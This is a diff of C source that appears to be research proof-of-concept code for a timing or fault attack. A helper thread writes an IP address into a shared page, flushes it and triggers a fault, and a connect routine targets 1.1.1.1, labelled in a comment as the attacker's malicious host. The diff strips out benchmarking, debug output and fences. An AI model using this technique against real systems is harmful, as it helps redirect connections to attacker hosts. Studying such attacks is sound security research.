@@ -67,12 +67,6 @@ pthread_cond_t  condition_cond  = PTHREAD_COND_INITIALIZER;
 
 static void display_thread_sched_attr(char *msg);
 
-static inline void busyloop(int overwrite_delay) {
-  for (int i = 0; i < overwrite_delay; i++) {
-    __asm__ volatile("" : "+g" (i) : :);
-  }
-}
-
 static volatile void write_char(char *string, int len) {
   for(int i = 0; i < len; i++) {
     page[i] = string[i];
@@ -436,37 +430,11 @@ static void *
 thread_start(void *arg)
 {
   set_affinity(2);
-  //display_thread_sched_attr("Scheduler attributes of new thread");
 
-  char fakename[] = "fake_file";
-  int overwrite_delay = *(int*)arg;
-  
   receiver();
-  //printf("overwrite_delay = %d\n", overwrite_delay);
-#ifdef BENCHMARK
-  uint64_t start = rdtsc();
-#endif 
-  // busy loop: this blocks other thread
-  // busyloop(overwrite_delay);
- 
-  // yield with syscall 
-  /*
-  int s = nanosleep_helper(overwrite_delay);
-  if (s != 0) {
-    handle_error_en(s, "nanosleep");
-  }*/
-#ifdef BENCHMARK
-  uint64_t end = rdtsc();
-  uint64_t diff = end - start;
-
-  printf("start = %ld, end = %ld, diff = %ld\n", start, end, diff);
-  fflush(stdout);
-#endif
-  asm volatile("mfence");
-  //write_char(fakename, sizeof(fakename));
+  //asm volatile("mfence");
   write_ip_addr(page);
-  //strncpy(page, fakename, sizeof(fakename));
-  asm volatile("mfence");
+  //asm volatile("mfence");
   flush(page);
   
   // trigger fault
@@ -501,8 +469,6 @@ void do_connect(struct sockaddr_in *serv_addr) {
    struct hostent *server;
 
    char buffer[256];
-
-   printf("do_connect\n");
    portno = 80;
 
    /* Create a socket point */
@@ -513,7 +479,7 @@ void do_connect(struct sockaddr_in *serv_addr) {
       exit(1);
    }
 
-   // We assume 1.1.1.1 is a malicious IP
+   // We assume 1.1.1.1 is a malicious IP that the attacker wants to connect
    server = gethostbyname("1.1.1.1");
 
    if (server == NULL) {
@@ -576,13 +542,8 @@ main(int argc, char *argv[]) {
   policy = SCHED_RR;
   set_child_scheduling(&attr, policy, priority); 
  
-  // read out the overwrite delay
-  int overwrite_delay = strtol(argv[1], NULL, 0);
-  printf("overwrite_delay=%d\n", overwrite_delay);
-
   // start new thread 
-  //s = pthread_create(&thread, &attr, &thread_start, &overwrite_delay);
-  s = pthread_create(&thread, NULL, &thread_start, &overwrite_delay);
+  s = pthread_create(&thread, NULL, &thread_start, NULL);
   if (s != 0)
       handle_error_en(s, "pthread_create");
 
